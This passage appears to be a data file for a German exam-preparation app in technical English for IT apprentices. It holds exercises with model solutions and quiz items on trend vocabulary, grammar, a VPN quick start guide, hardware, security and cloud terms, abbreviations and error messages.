      task: `<p>Die Nordlicht IT GmbH hat im März einen KI-Chatbot für Standardanfragen eingeführt. Die durchschnittliche Reaktionszeit des Service Desks (in Minuten):</p>
        <table><thead><tr><th>Jan</th><th>Feb</th><th>Mar</th><th>Apr</th><th>May</th><th>Jun</th></tr></thead><tbody>
          <tr><td>38</td><td>35</td><td>21</td><td>14</td><td>14</td><td>16</td></tr>
        </tbody></table>
        <p>a) Berechne die prozentuale Veränderung von Februar auf März, von März auf April und von Januar auf Juni (je eine Nachkommastelle). (3 Punkte)</p>
        <p>b) Beschreibe die Entwicklung in 4–6 englischen Sätzen. Verwende Trendvokabular und die Präpositionen <em>from … to</em>, <em>by</em> und <em>at</em>. (5 Punkte)</p>
        <p>c) Welche Diagrammart eignet sich für diese Daten? Begründe kurz. (1 Punkt)</p>
        <p>d) Beschreibe den Ablauf „Ein Anwender meldet eine Störung“ in vier englischen Sätzen mit Sequencing-Wörtern und Passiv. (4 Punkte)</p>`,
      hints: ["Veränderung in % = (neu − alt) ÷ alt × 100"],
      solution: `<p><strong>a)</strong> Feb → Mar: (21 − 35) ÷ 35 × 100 = −14 ÷ 35 × 100 = <strong>−40,0 %</strong><br>Mar → Apr: (14 − 21) ÷ 21 × 100 = −7 ÷ 21 × 100 ≈ <strong>−33,3 %</strong><br>Jan → Jun: (16 − 38) ÷ 38 × 100 = −22 ÷ 38 × 100 ≈ <strong>−57,9 %</strong></p>
        <p><strong>b)</strong> Beispiel: „The table shows the average response time of the service desk from January to June. In January and February, the response time decreased slightly from 38 to 35 minutes. After the AI chatbot was introduced in March, it fell sharply by 14 minutes to 21 minutes, a drop of 40 %. In April, it went down further to 14 minutes and remained stable at 14 minutes in May. In June, it rose slightly to 16 minutes. Overall, the response time decreased by about 58 % between January and June.“</p>
        <p><strong>c)</strong> Ein <strong>Liniendiagramm (line graph)</strong>, weil es eine Entwicklung über die Zeit zeigt und Trends und Wendepunkte gut sichtbar macht.</p>
        <p><strong>d)</strong> Beispiel: „First, the incident is reported by the user via phone, email or self-service portal. Then, a ticket is created and the incident is categorised and prioritised by the first-level support. After that, the incident is solved or, if necessary, escalated to the second-level support. Finally, the solution is documented, the user is informed and the ticket is closed.“</p>`
    },
    {
      id: "e-gram-1",
      topic: "grammatik-false-friends",
      title: "Grammatik-Training: Passiv, Imperativ, if-Sätze, False Friends",
      level: 1,
      exam: [],
      task: `<p>Du überarbeitest für die Nordlicht IT GmbH ein englisches Handbuch und mehrere Ticket-Texte.</p>
        <p>a) Setze ins Passiv: (1) We back up the database every night. (2) The technician replaced the power supply yesterday. (3) Someone has changed the admin password. (4) We will install the update on Sunday. (4 Punkte)</p>
        <p>b) Formuliere als Anleitung im Imperativ: (1) Man sollte das Gerät vor dem Öffnen vom Strom trennen. (2) Man darf das Kabel während des Updates nicht ziehen. (2 Punkte)</p>
        <p>c) Ergänze die if-Sätze: (1) If the status LED ______ (flash) amber, the fan is defective. (2) If you ______ (not save) your work, you will lose it. (3) If we ______ (have) a UPS, the server would not shut down during power cuts. (3 Punkte)</p>
        <p>d) Korrigiere die False Friends: (1) Can you control the log files? (2) Eventually the server is broken. (3) We store sensible customer data. (4) I will become the new laptop tomorrow. (4 Punkte)</p>
        <p>e) Übersetze: „You must not share your password“ und „You don't have to restart the PC“. (2 Punkte)</p>`,
      solution: `<p><strong>a)</strong> (1) The database is backed up every night. (2) The power supply was replaced (by the technician) yesterday. (3) The admin password has been changed. (4) The update will be installed on Sunday.</p>
        <p><strong>b)</strong> (1) Disconnect the device from the power supply before opening it. (2) Do not (Don't) unplug the cable during the update.</p>
        <p><strong>c)</strong> (1) flashes (Typ 0 – immer gültig) (2) don't save / do not save (Typ 1 – kein <em>will</em> im if-Teil) (3) had (Typ 2 – gedachte Situation)</p>
        <p><strong>d)</strong> (1) Can you <strong>check</strong> the log files? (<em>control</em> = steuern) (2) <strong>Possibly/Perhaps</strong> the server is broken. (<em>eventually</em> = schließlich) (3) We store <strong>sensitive</strong> customer data. (<em>sensible</em> = vernünftig) (4) I will <strong>get/receive</strong> the new laptop tomorrow. (<em>become</em> = werden)</p>
        <p><strong>e)</strong> „You must not share your password“ = Du <strong>darfst</strong> dein Passwort <strong>nicht</strong> weitergeben. „You don't have to restart the PC“ = Du <strong>musst</strong> den PC <strong>nicht</strong> neu starten (es ist nicht nötig).</p>`
    },
    {
      id: "e-doc-3",
      topic: "datenblatt-manual",
      title: "Quick Start Guide auf Englisch für die Übergabe schreiben",
      level: 2,
      exam: ["AP2"],
      task: `<p>Die WindService Nord GmbH in Husum beschäftigt Servicetechniker aus Dänemark, Polen und Spanien; auf den Baustellen wird Englisch gesprochen. Die Nordlicht IT GmbH hat für sie ein VPN mit WireGuard eingerichtet und übergibt die Notebooks mit einer kurzen englischen Anleitung. Deine Notizen:</p>
        <ol>
          <li>Notebook einschalten, mit dem Firmenkonto anmelden</li>
          <li>mit WLAN oder Mobilfunk-Hotspot verbinden</li>
          <li>WireGuard-App über das Symbol in der Taskleiste öffnen</li>
          <li>Tunnel „WSN-Office“ auswählen, auf „Activate“ klicken</li>
          <li>warten, bis der Status „Active“ angezeigt wird; Test: Intranet im Browser öffnen</li>
          <li>nach Feierabend auf „Deactivate“ klicken</li>
        </ol>
        <p>Wichtig: Die Konfigurationsdatei enthält einen privaten Schlüssel und darf nicht weitergegeben werden. Bekannte Probleme: In manchen Hotel-WLANs wird das VPN (UDP) blockiert; ohne Internetverbindung baut sich der Tunnel nicht auf.</p>
        <p>a) Schreibe den Quick Start Guide auf Englisch als nummerierte Schritte im Imperativ. (6 Punkte)</p>
        <p>b) Formuliere einen Sicherheitshinweis auf Englisch mit passendem Signalwort und begründe die Wahl des Signalworts auf Deutsch. (2 Punkte)</p>
        <p>c) Ergänze eine englische Troubleshooting-Tabelle mit zwei Zeilen (Problem – likely cause – fix). (4 Punkte)</p>`,
      hints: ["Imperativ = Grundform ohne Subjekt: Switch on …, Connect …, Click …", "DANGER/WARNING/CAUTION beziehen sich auf Verletzungsgefahr – hier geht es um Sicherheit von Daten."],
      solution: `<p><strong>a)</strong> <em>Quick Start Guide – VPN access with WireGuard</em></p>
        <ol>
          <li>Switch on the notebook and log in with your company account.</li>
          <li>Connect to a Wi-Fi network or to a mobile hotspot.</li>
          <li>Open the WireGuard app via the icon in the taskbar.</li>
          <li>Select the tunnel “WSN-Office” and click “Activate”.</li>
          <li>Wait until the status shows “Active”. Then open the intranet in your browser to test the connection.</li>
          <li>When you have finished work, click “Deactivate”.</li>
        </ol>
        <p><strong>b)</strong> „<strong>NOTICE:</strong> Do not share or copy the configuration file. It contains your private key.“ – NOTICE ist passend, weil keine Verletzungsgefahr für Personen besteht (dafür wären DANGER, WARNING oder CAUTION gedacht), sondern ein Schaden an Daten bzw. der IT-Sicherheit droht.</p>
        <p><strong>c)</strong></p>
        <table><thead><tr><th>Problem</th><th>Likely cause</th><th>Fix</th></tr></thead><tbody>
          <tr><td>The tunnel does not connect.</td><td>There is no internet connection.</td><td>Connect to Wi-Fi or a mobile hotspot first, then activate the tunnel again.</td></tr>
          <tr><td>The tunnel does not connect in a hotel.</td><td>The hotel Wi-Fi blocks VPN traffic (UDP).</td><td>Use your mobile hotspot instead. If the problem continues, contact the service desk.</td></tr>
        </tbody></table>`
    },
  ],
  quiz: [
    { id: "q-lesen-1", topic: "pruefung-lesen", type: "single",
      q: "Was ist mit der Lesestrategie <strong>Skimming</strong> gemeint?",
      options: ["Einen Text überfliegen, um schnell das Thema und den groben Inhalt zu erfassen", "Einen Text gezielt nach einer bestimmten Zahl oder einem Schlüsselwort durchsuchen", "Einen Text Satz für Satz genau übersetzen", "Unbekannte Wörter im Wörterbuch nachschlagen und notieren"],
      answer: 0,
      explain: "Skimming = Überfliegen (Überschriften, erste Sätze, Hervorhebungen), um zu verstehen, worum es geht. Das gezielte Suchen nach bestimmten Informationen heißt Scanning; das genaue Lesen der relevanten Stellen heißt Detailed Reading." },
    { id: "q-lesen-2", topic: "pruefung-lesen", type: "tf",
      q: "In der AP1 beantwortest du Fragen zu einem englischen Text grundsätzlich auf Englisch.",
      answer: false,
      explain: "Falsch. Wenn die Aufgabe nichts anderes verlangt, antwortest du auf Deutsch – die Prüfung testet, ob du den Inhalt verstanden hast. Laut Erfahrungsberichten von Prüflingen hat eine Antwort auf Englisch in der AP1 Herbst 2025 Punkte gekostet." },
    { id: "q-lesen-3", topic: "pruefung-lesen", type: "single",
      q: "A datasheet says: <em>“IR range: up to 30 m”</em>. What does <em>up to</em> mean here?",
      options: ["bis zu – 30 m ist der Höchstwert unter guten Bedingungen", "mindestens 30 m – der Wert wird immer übertroffen", "genau 30 m – der Wert ist garantiert", "durchschnittlich 30 m – gemessen über einen Tag"],
      answer: 0,
      explain: "„Up to“ bedeutet „bis zu“ und nennt einen Maximalwert, der unter Idealbedingungen erreicht wird. In der Praxis (Nebel, Regen, Reflexionen) kann die Reichweite geringer sein. Es ist weder ein Mindest- noch ein garantierter Wert." },
    { id: "q-lesen-4", topic: "pruefung-lesen", type: "multi",
      q: "Welche Vor- bzw. Nachsilben bedeuten „nicht“ oder „ohne“?",
      options: ["un- (unavailable)", "-less (fanless)", "dis- (disconnected)", "re- (reboot)", "pre- (pre-installed)", "-able (adjustable)"],
      answer: [0, 1, 2],
      explain: "un-, dis- (nicht) und -less (ohne) verneinen: unavailable = nicht verfügbar, disconnected = getrennt, fanless = ohne Lüfter. re- heißt „erneut“, pre- „vorab“ und -able „kann/lässt sich“ (adjustable = verstellbar)." },
    { id: "q-hw-1", topic: "vokabeln-hardware", type: "single",
      q: "What is the German term for <em>power consumption</em>?",
      options: ["Leistungsaufnahme", "Stromversorgung", "Wirkungsgrad", "Netzteil"],
      answer: 0,
      explain: "Power consumption ist die Leistungsaufnahme eines Geräts in Watt. Stromversorgung heißt power supply, das Netzteil power supply unit (PSU), der Wirkungsgrad efficiency." },
    { id: "q-hw-2", topic: "vokabeln-hardware", type: "single",
      q: "Im Datenblatt eines Servers steht: <em>“hot-swappable drive bays”</em>. Was bedeutet das?",
      options: ["Die Festplatten können im laufenden Betrieb getauscht werden", "Die Einbauschächte werden aktiv gekühlt, weil sie heiß werden", "Die Festplatten sind besonders hitzebeständig", "Die Einbauschächte können nur bei ausgeschaltetem Server bestückt werden"],
      answer: 0,
      explain: "Hot-swappable heißt „im laufenden Betrieb austauschbar“ – wichtig für Server, die nicht heruntergefahren werden sollen. „Hot“ bezieht sich hier auf den eingeschalteten Zustand, nicht auf Temperatur." },
    { id: "q-hw-3", topic: "vokabeln-hardware", type: "single",
      q: "Ein Monitor unterstützt <em>daisy chaining</em>. Was ist damit gemeint?",
      options: ["Ein zweiter Monitor kann am Ausgang des ersten angeschlossen werden (Reihenschaltung)", "Der Monitor kann zwei Rechner gleichzeitig anzeigen (Bild-in-Bild)", "Der Monitor lässt sich an einer Wandhalterung befestigen", "Der Monitor passt die Helligkeit automatisch an das Umgebungslicht an"],
      answer: 0,
      explain: "Daisy chaining bedeutet Reihenschaltung: Monitor 2 hängt am DisplayPort-Ausgang von Monitor 1 (per MST), nur Monitor 1 ist mit dem Rechner verbunden. Bild-in-Bild heißt Picture-in-Picture (PiP), eine Wandhalterung VESA mount." },
    { id: "q-hw-4", topic: "vokabeln-hardware", type: "tf",
      q: "<em>Backward compatible</em> bedeutet, dass ein Gerät oder Standard auch mit älteren Versionen zusammenarbeitet.",
      answer: true,
      explain: "Richtig. Abwärtskompatibel heißt: Ein USB-3.2-Anschluss funktioniert z. B. auch mit einem USB-2.0-Stick – dann allerdings nur mit der Geschwindigkeit des älteren Standards." },
    { id: "q-hw-5", topic: "vokabeln-hardware", type: "input",
      q: "Wie groß ist die Bildschirmdiagonale eines 27-Zoll-Monitors in cm? (zwei Nachkommastellen)",
      answer: ["68,58", "68.58", "68,58 cm", "68.58 cm"],
      explain: "1 inch = 2,54 cm → 27 × 2,54 cm = 68,58 cm." },
    { id: "q-hw-6", topic: "vokabeln-hardware", type: "multi",
      q: "Which of these datasheet terms describe <strong>ergonomic</strong> features of a monitor?",
      options: ["height-adjustable", "anti-glare", "flicker-free", "pivot", "65 W power delivery", "DisplayPort out"],
      answer: [0, 1, 2, 3],
      explain: "Höhenverstellbar, entspiegelt, flimmerfrei und ins Hochformat drehbar (pivot) betreffen die Ergonomie des Bildschirmarbeitsplatzes. Power delivery (Laden des Notebooks über USB-C) und DisplayPort out (Anschluss eines zweiten Monitors) sind Anschlussmerkmale." },
    { id: "q-hw-7", topic: "vokabeln-hardware", type: "single",
      q: "In einem englischen Angebot steht: <em>“You can purchase or lease the multifunction printers.”</em> Was bedeutet <em>lease</em> hier?",
      options: ["leasen – die Geräte gegen eine laufende Rate nutzen, ohne sie zu kaufen", "kaufen und sofort vollständig bezahlen", "zur Probe kostenlos ausleihen", "reparieren lassen"],
      answer: 0,
      explain: "To lease = leasen: Nutzung gegen regelmäßige Leasingraten, Eigentümer bleibt der Leasinggeber. To purchase = kaufen, eine kostenlose Testphase wäre a free trial, eine Reparatur a repair. Achtung: Im DHCP-Kontext bedeutet lease dagegen die befristete Adresszuweisung." },
    { id: "q-hw-8", topic: "vokabeln-hardware", type: "single",
      q: "What is a <em>heat sink</em>?",
      options: ["ein Kühlkörper, der die Wärme z. B. der CPU an die Umgebungsluft abgibt", "die Wärmeleitpaste zwischen CPU und Kühler", "ein Temperatursensor auf der Hauptplatine", "die eingebaute Heizung einer Außenkamera"],
      answer: 0,
      explain: "Heat sink = Kühlkörper (meist mit Lamellen aus Aluminium oder Kupfer). Wärmeleitpaste heißt thermal paste, ein Temperatursensor temperature sensor, die Kamera-Heizung heater." },
    { id: "q-hw-9", topic: "vokabeln-hardware", type: "input",
      q: "Ein Server ist laut Datenblatt <em>2U</em> hoch. Wie viele cm sind das? (1 U = 1,75 inch; zwei Nachkommastellen)",
      answer: ["8,89", "8.89", "8,89 cm", "8.89 cm"],
      explain: "2 × 1,75 inch = 3,5 inch; 3,5 × 2,54 cm = 8,89 cm. U steht für rack unit (Höheneinheit im 19-Zoll-Schrank)." },
    { id: "q-netsec-1", topic: "vokabeln-netzwerk-security", type: "single",
      q: "Which term describes the data rate that is <strong>actually achieved</strong> on a connection?",
      options: ["throughput", "bandwidth", "latency", "jitter"],
      answer: 0,
      explain: "Throughput (Durchsatz) ist die tatsächlich erreichte Datenrate. Bandwidth (Bandbreite) ist der theoretische Höchstwert, latency die Verzögerung und jitter die Schwankung der Verzögerung." },
    { id: "q-netsec-2", topic: "vokabeln-netzwerk-security", type: "single",
      q: "Eine Mitarbeiterin hat sich erfolgreich angemeldet, darf den Ordner „HR“ aber nicht öffnen. Welcher Vorgang verhindert den Zugriff?",
      options: ["authorization", "authentication", "encryption", "availability"],
      answer: 0,
      explain: "Authorization (Autorisierung) prüft, was eine bereits identifizierte Person darf. Authentication (Authentifizierung) war erfolgreich – die Identität ist bestätigt. Encryption ist Verschlüsselung, availability Verfügbarkeit." },
    { id: "q-netsec-3", topic: "vokabeln-netzwerk-security", type: "single",
      q: "What is a <em>vulnerability</em>?",
      options: ["eine Schwachstelle, z. B. ein Fehler in Software, den ein Angreifer ausnutzen kann", "ein Angriffscode, der eine Schwachstelle ausnutzt", "eine Bedrohung wie eine Ransomware-Gruppe", "eine Fehlerkorrektur des Herstellers"],
      answer: 0,
      explain: "Vulnerability = Schwachstelle. Der Angriffscode heißt exploit, die Bedrohung threat und die Fehlerkorrektur patch. Merke: threat + vulnerability ergibt ein risk." },
    { id: "q-netsec-4", topic: "vokabeln-netzwerk-security", type: "tf",
      q: "„Sensible data“ ist die korrekte englische Bezeichnung für sensible (besonders schützenswerte) Daten.",
      answer: false,
      explain: "Falsch – klassischer False Friend. „Sensible“ heißt „vernünftig“. Besonders schützenswerte Daten sind „sensitive data“." },
    { id: "q-netsec-5", topic: "vokabeln-netzwerk-security", type: "multi",
      q: "Which terms form the <strong>CIA triad</strong> of information security?",
      options: ["confidentiality", "integrity", "availability", "authenticity", "accountability"],
      answer: [0, 1, 2],
      explain: "Die CIA-Triade sind die drei Grundwerte bzw. Schutzziele Vertraulichkeit (confidentiality), Integrität (integrity) und Verfügbarkeit (availability). Authentizität und Zurechenbarkeit werden manchmal ergänzt, gehören aber nicht zur klassischen Triade." },
    { id: "q-netsec-6", topic: "vokabeln-netzwerk-security", type: "single",
      q: "In einem Router-Handbuch steht: <em>“The default lease time is 24 hours.”</em> Was ist gemeint?",
      options: ["Eine per DHCP vergebene IP-Adresse gilt standardmäßig 24 Stunden und muss dann verlängert werden", "Der Router darf 24 Stunden lang gemietet werden", "Nach 24 Stunden startet der Router automatisch neu", "Die Firewall-Protokolle werden 24 Stunden lang gespeichert"],
      answer: 0,
      explain: "Lease heißt wörtlich „Miete/Pacht“. Bei DHCP ist es die befristete Zuweisung einer IP-Adresse; der Client verlängert sie rechtzeitig (üblicherweise nach der Hälfte der Zeit)." },
    { id: "q-netsec-7", topic: "vokabeln-netzwerk-security", type: "single",
      q: "A firewall rule has the action <em>drop</em>. What happens to a matching packet?",
      options: ["Es wird stillschweigend verworfen, der Absender erhält keine Rückmeldung", "Es wird verworfen und der Absender erhält eine Ablehnungsmeldung", "Es wird durchgelassen und protokolliert", "Es wird an einen anderen Server umgeleitet"],
      answer: 0,
      explain: "Drop = stillschweigend verwerfen. Reject lehnt ab und schickt eine Rückmeldung (z. B. TCP-Reset oder ICMP „unreachable“). Allow/accept lässt das Paket durch; Umleiten wäre z. B. Port-Forwarding bzw. NAT." },
    { id: "q-netsec-8", topic: "vokabeln-netzwerk-security", type: "tf",
      q: "Mit <em>restore</em> ist in einem englischen Backup-Handbuch das Anlegen einer Datensicherung gemeint.",
      answer: false,
      explain: "Falsch. Backup ist die Datensicherung, restore die Wiederherstellung der Daten aus dieser Sicherung. Recovery meint allgemeiner den Wiederanlauf eines Systems nach einem Ausfall." },
    { id: "q-netsec-9", topic: "vokabeln-netzwerk-security", type: "single",
      q: "A security advisory warns of a <em>zero-day vulnerability</em>. What does that mean?",
      options: ["Eine Schwachstelle, die Angreifer ausnutzen können, bevor der Hersteller einen Patch bereitstellt", "Eine Schwachstelle, die der Hersteller am Tag ihrer Entdeckung bereits geschlossen hat", "Ein Angriff, der nur am ersten Tag nach einer Neuinstallation möglich ist", "Eine Schwachstelle, deren Risiko mit null bewertet wurde"],
      answer: 0,
      explain: "Zero-day: Der Hersteller hatte „null Tage“ Zeit zur Reaktion – es gibt noch keinen Patch, deshalb helfen nur Workarounds (z. B. Dienst abschalten, Zugriff einschränken). Mit der Installation oder einem Risiko von null hat der Begriff nichts zu tun." },
    { id: "q-cloud-1", topic: "vokabeln-software-cloud", type: "single",
      q: "In den Release Notes steht: <em>“The legacy API is deprecated.”</em> Was bedeutet das?",
      options: ["Die alte Schnittstelle funktioniert noch, wird aber in einer späteren Version entfernt", "Die alte Schnittstelle wurde bereits entfernt und funktioniert nicht mehr", "Die alte Schnittstelle wurde verbessert und ist jetzt empfohlen", "Die alte Schnittstelle ist nur noch gegen Aufpreis verfügbar"],
      answer: 0,
      explain: "Deprecated = abgekündigt/veraltet: Die Funktion ist noch vorhanden, man soll aber auf eine Alternative umsteigen, weil sie künftig entfernt wird (dann heißt es „removed“)." },
    { id: "q-cloud-2", topic: "vokabeln-software-cloud", type: "single",
      q: "What does <em>on-premises</em> mean?",
      options: ["Die Software läuft auf eigener Hardware im eigenen Haus bzw. Rechenzentrum", "Die Software wird als Abo aus der Cloud genutzt", "Die Software wird vor der Installation getestet", "Die Software ist kostenlos und quelloffen"],
      answer: 0,
      explain: "On-premises (kurz on-prem) heißt „vor Ort, in den eigenen Räumen“ – Gegenteil zur Cloud-Nutzung (z. B. SaaS). Mit Testen, Lizenzkosten oder Open Source hat der Begriff nichts zu tun." },
    { id: "q-cloud-3", topic: "vokabeln-software-cloud", type: "input",
      q: "Ein Cloud-Anbieter garantiert <em>“99.9 % monthly uptime”</em>. Wie viele Minuten ungeplanter Ausfall sind in einem Monat mit 30 Tagen erlaubt?",
      answer: ["43,2", "43.2", "43,2 min", "43.2 min", "43,2 minuten"],
      explain: "30 × 24 × 60 min = 43.200 min. Erlaubter Ausfall = (1 − 0,999) × 43.200 min = 0,001 × 43.200 min = 43,2 min." },
    { id: "q-cloud-4", topic: "vokabeln-software-cloud", type: "single",
      q: "Was ist in einem Cloud-Angebot mit <em>tenant</em> gemeint?",
      options: ["der abgegrenzte Bereich (Mandant) eines Kunden in der Cloud", "der Mieter eines Büros im Rechenzentrum", "ein Techniker des Cloud-Anbieters vor Ort", "eine zeitlich befristete Testlizenz"],
      answer: 0,
      explain: "Tenant heißt wörtlich Mieter; in der IT ist es der Mandant – die logisch getrennte Umgebung eines Kunden mit eigenen Benutzern, Daten und Einstellungen (z. B. Microsoft-365-Tenant)." },
    { id: "q-cloud-5", topic: "vokabeln-software-cloud", type: "multi",
      q: "Which of the following are <strong>risks</strong> of using an AI chatbot in first-level support?",
      options: ["hallucinations – plausible but wrong answers", "bias caused by one-sided training data", "data protection problems when users enter personal data", "availability 24 hours a day, 7 days a week", "lower costs for standard requests"],
      answer: [0, 1, 2],
      explain: "Risiken sind falsche, aber überzeugend klingende Antworten (Halluzinationen), Verzerrungen durch einseitige Trainingsdaten und Datenschutzprobleme bei personenbezogenen Eingaben. Ständige Erreichbarkeit und geringere Kosten für Standardanfragen sind Vorteile." },
    { id: "q-cloud-6", topic: "vokabeln-software-cloud", type: "tf",
      q: "Ein <em>upgrade</em> ist meist der Wechsel auf eine neue Haupt- oder höherwertige Version, ein <em>update</em> eine Aktualisierung innerhalb der vorhandenen Version.",
      answer: true,
      explain: "Richtig. Updates (z. B. Sicherheits- oder Fehlerkorrekturen) bleiben in der Version; ein Upgrade (z. B. von Version 6 auf 7 oder von Standard auf Professional) bringt neue Funktionen und kostet oft Geld oder Umstellungsaufwand." },
    { id: "q-cloud-7", topic: "vokabeln-software-cloud", type: "single",
      q: "Eine Anwendung soll durch <em>scaling out</em> mehr Last bewältigen. Was wird gemacht?",
      options: ["Es werden weitere Server bzw. Instanzen hinzugefügt (horizontal skalieren)", "Der vorhandene Server bekommt mehr CPU und RAM (vertikal skalieren)", "Die Anwendung wird auf einen kleineren Server verschoben", "Die Anwendung wird außerhalb der Geschäftszeiten abgeschaltet"],
      answer: 0,
      explain: "Scale out = horizontal: mehr Maschinen, Last wird z. B. per Load Balancer verteilt. Scale up = vertikal: eine stärkere Maschine. Verkleinern heißt scale down bzw. scale in." },
    { id: "q-abk-1", topic: "abkuerzungen", type: "single",
      q: "Ein Lieferant schreibt: <em>“The ETA for your order is Monday.”</em> Was bedeutet ETA?",
      options: ["estimated time of arrival – voraussichtliche Ankunft/Lieferung", "end of the agreement – Vertragsende", "extra transport allowance – Transportzuschlag", "electronic tracking address – Sendungsverfolgung"],
      answer: 0,
      explain: "ETA = estimated time of arrival, also die voraussichtliche Ankunfts- bzw. Lieferzeit. Die anderen Auflösungen sind erfunden." },
    { id: "q-abk-2", topic: "abkuerzungen", type: "single",
      q: "Eine E-Mail aus den USA nennt als Liefertermin <em>10/02/2026</em>. Welches Datum ist gemeint?",
      options: ["2. Oktober 2026", "10. Februar 2026", "10. Dezember 2026", "20. Oktober 2026"],
      answer: 0,
      explain: "In den USA gilt Monat/Tag/Jahr → 10/02 = 2. Oktober. In Großbritannien (Tag/Monat/Jahr) wäre es der 10. Februar. Eindeutig ist nur das ISO-Format 2026-10-02." },
    { id: "q-abk-3", topic: "abkuerzungen", type: "input",
      q: "Ein Datenblatt nennt als maximale Betriebstemperatur 104 °F. Wie viel Grad Celsius sind das?",
      answer: ["40", "40 °C", "40°C", "40°", "40 grad", "40 grad celsius", "40 c"],
      explain: "°C = (°F − 32) × 5/9 = (104 − 32) × 5/9 = 72 × 5/9 = 40 °C." },
    { id: "q-abk-4", topic: "abkuerzungen", type: "single",
      q: "Ein Hersteller meldet einen Umsatz von <em>“2 billion dollars”</em>. Wie viel ist das auf Deutsch?",
      options: ["2 Milliarden Dollar", "2 Billionen Dollar", "2 Millionen Dollar", "200 Millionen Dollar"],
      answer: 0,
      explain: "Englisch billion = 10⁹ = deutsch Milliarde. Die deutsche Billion (10¹²) heißt im Englischen trillion. Ein typischer False Friend bei Zahlen." },
    { id: "q-abk-5", topic: "abkuerzungen", type: "multi",
      q: "Welche Zuordnungen von Abkürzung und Bedeutung sind richtig?",
      options: ["RMA – Rücksendenummer für Reparatur oder Austausch", "EOL – Ende der Produktion bzw. Unterstützung eines Produkts", "PSU – Netzteil", "NIC – Netzwerkinstallation durch den Hersteller", "TBD – bereits fest vereinbart"],
      answer: [0, 1, 2],
      explain: "RMA = return merchandise authorization, EOL = end of life, PSU = power supply unit. NIC steht für network interface card (Netzwerkkarte), TBD für to be determined – also gerade noch nicht festgelegt." },
    { id: "q-abk-6", topic: "abkuerzungen", type: "tf",
      q: "Eine Angabe von 1 Gbps entspricht einer Datenrate von 1 Gigabyte pro Sekunde.",
      answer: false,
      explain: "Falsch. Gbps = Gigabit pro Sekunde. 1 Gbit/s = 1.000 Mbit/s ÷ 8 = 125 MB/s. Kleines b = bit, großes B = Byte." },
    { id: "q-abk-7", topic: "abkuerzungen", type: "single",
      q: "What does <em>i.e.</em> mean in the sentence <em>“The update requires a restart, i.e. the server will be offline for five minutes.”</em>?",
      options: ["das heißt", "zum Beispiel", "und so weiter", "im Gegensatz dazu"],
      answer: 0,
      explain: "i.e. (id est) = „das heißt“ und leitet eine genaue Erklärung ein. „Zum Beispiel“ wäre e.g. (exempli gratia), „und so weiter“ etc." },
    { id: "q-doc-1", topic: "datenblatt-manual", type: "single",
      q: "Welches Signalwort in einer englischen Bedienungsanleitung warnt vor einer Gefahr, die zu Tod oder schweren Verletzungen führen <strong>kann</strong>?",
      options: ["WARNING", "DANGER", "CAUTION", "NOTICE"],
      answer: 0,
      explain: "WARNING = kann zu Tod oder schwerer Verletzung führen. DANGER steht für eine Gefahr, die bei Nichtbeachtung sicher dazu führt, CAUTION für leichte bis mittlere Verletzungen, NOTICE für mögliche Sachschäden." },
    { id: "q-doc-2", topic: "datenblatt-manual", type: "single",
      q: "Eine Software springt nach Semantic Versioning von 4.2.7 auf 5.0.0. Was bedeutet das?",
      options: ["Es gibt inkompatible Änderungen (breaking changes) – vor dem Upgrade testen", "Es wurden nur kleine Fehler behoben", "Es gibt neue Funktionen, die vollständig abwärtskompatibel sind", "Es handelt sich um eine Testversion"],
      answer: 0,
      explain: "MAJOR.MINOR.PATCH: Eine neue Hauptversion (MAJOR) signalisiert inkompatible Änderungen. Reine Fehlerkorrekturen erhöhen PATCH (4.2.8), abwärtskompatible neue Funktionen MINOR (4.3.0). Testversionen erkennt man an Zusätzen wie -beta." },
    { id: "q-doc-3", topic: "datenblatt-manual", type: "multi",
      q: "Welche Rubriken findest du typischerweise in einem Changelog nach dem Muster „Keep a Changelog“?",
      options: ["Added", "Fixed", "Security", "Deprecated", "Ordered", "Warranty"],
      answer: [0, 1, 2, 3],
      explain: "Übliche Rubriken sind Added, Changed, Deprecated, Removed, Fixed und Security. „Ordered“ (bestellt) und „Warranty“ (Garantie) gehören in Bestellungen bzw. Datenblätter, nicht in einen Changelog." },
    { id: "q-doc-4", topic: "datenblatt-manual", type: "input",
      q: "Eine Kamera nimmt laut Datenblatt <em>max. 9.6 W</em> auf. Welcher Strom in mA fließt bei 48 V?",
      answer: ["200", "200 mA", "200ma", "0,2 A", "0.2 A"],
      explain: "I = P ÷ U = 9,6 W ÷ 48 V = 0,2 A = 200 mA. Achtung: Im englischen Datenblatt steht der Punkt als Dezimaltrennzeichen (9.6 W = 9,6 W)." },
    { id: "q-doc-5", topic: "datenblatt-manual", type: "single",
      q: "What does <em>IP67</em> mean in the datasheet of an outdoor camera?",
      options: ["staubdicht und geschützt gegen zeitweiliges Untertauchen", "die Kamera hat die feste IP-Adresse .67", "die Kamera unterstützt 67 gleichzeitige Verbindungen", "die Kamera ist bis 67 °C betriebsfähig"],
      answer: 0,
      explain: "IP steht hier für Ingress Protection (Schutzart nach IEC 60529): Die erste Ziffer 6 bedeutet staubdicht, die zweite Ziffer 7 Schutz gegen zeitweiliges Untertauchen. Mit IP-Adressen oder Temperaturen hat die Angabe nichts zu tun." },
    { id: "q-doc-6", topic: "datenblatt-manual", type: "tf",
      q: "Um das PoE-Budget eines Switches zu planen, rechnest du mit der typischen (durchschnittlichen) Leistungsaufnahme der Endgeräte.",
      answer: false,
      explain: "Falsch. Für die Dimensionierung (PoE-Budget, Netzteil, USV) nimmt man den Maximalwert bzw. die reservierte Leistung der PoE-Klasse, sonst reicht die Leistung in Spitzenzeiten nicht (z. B. wenn die Kamera-Heizung anspringt). Der typische Wert dient für Stromkostenrechnungen." },
    { id: "q-err-1", topic: "fehlermeldungen", type: "single",
      exam: ["AP2"],
      q: "Ein Admin erhält: <em>“ssh: connect to host 10.0.0.5 port 22: Connection refused”</em>. Was ist die wahrscheinlichste Ursache?",
      options: ["Der Host ist erreichbar, aber auf Port 22 nimmt kein Dienst Verbindungen an", "Der Host ist ausgeschaltet oder nicht erreichbar", "Das Passwort ist falsch", "Der DNS-Name konnte nicht aufgelöst werden"],
      answer: 0,
      explain: "„Refused“ heißt: Der Zielrechner hat aktiv abgelehnt – er ist also erreichbar, aber der SSH-Dienst läuft nicht oder eine Host-Firewall lehnt ab. Bei ausgeschaltetem Host käme eher „timed out“ oder „no route to host“, bei falschem Passwort „Permission denied“, bei DNS-Problemen „Could not resolve hostname“." },
    { id: "q-err-2", topic: "fehlermeldungen", type: "single",
      exam: ["AP2"],
      q: "Ein angemeldeter Benutzer ruft eine Intranetseite auf und erhält <em>403 Forbidden</em>. Was bedeutet das?",
